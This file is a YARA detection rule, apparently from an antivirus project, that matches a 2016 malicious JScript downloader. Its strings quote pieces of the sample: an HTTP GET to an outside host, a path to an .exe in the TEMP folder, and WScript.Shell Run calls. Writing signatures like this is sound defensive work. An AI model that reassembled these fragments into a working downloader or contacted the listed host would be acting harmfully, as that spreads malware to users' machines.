rule sig_20160329_b630462d39ea18e76788557a9a8d3a35 {
  meta:
    description = "datamaliciousorder - file 20160329_b630462d39ea18e76788557a9a8d3a35.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e8caf83a3c0b42796fb5987396a94e6c8a13db22d38c35a78974c3e6e1f70653"

  strings:
    $s1  = "i0[Bl](\"GET\", \"http://dealingdeuces.com/o4pskd\", false);" fullword ascii
    $s2  = "function fX() {return gL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"qTDRPnJMiQ.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[z](UJ() * 11); if (i0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var gL = function S() {return WScript[e](\"WScript.Shell\");}(), a1 = 11;" fullword ascii
    $s5  = "function Z(zH, n){l = l * 1; return zH - n;};" fullword ascii
    $s6  = "function uO(){return \"\" + MT;};" fullword ascii
    $s7  = "function TX(O){gL[\"Run\"](O, l, l);};" fullword ascii
    $s8  = "function a() {return ((Ho == true) && (Ho == uL)) ? 1 : l;};" fullword ascii
    $s9  = "var lg = new this[\"Date\"]();" fullword ascii
    $s10 = " while (i){" fullword ascii
    $s11 = "function M(){return e;};" fullword ascii
    $s12 = "function UJ(){return 22;};" fullword ascii
    $s13 = "function aH()" fullword ascii
    $s14 = "return Z(Py, aB);" fullword ascii
    $s15 = "function R(hu) {var Rt = (1, 2, 3, 4, 5, hu); return Rt;};" fullword ascii
    $s16 = "var uL = false;" fullword ascii
    $s17 = "var eF = false;" fullword ascii
    $s18 = "var Ho = false;" fullword ascii
    $s19 = "Ho = true; " fullword ascii
    $s20 = "uL = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}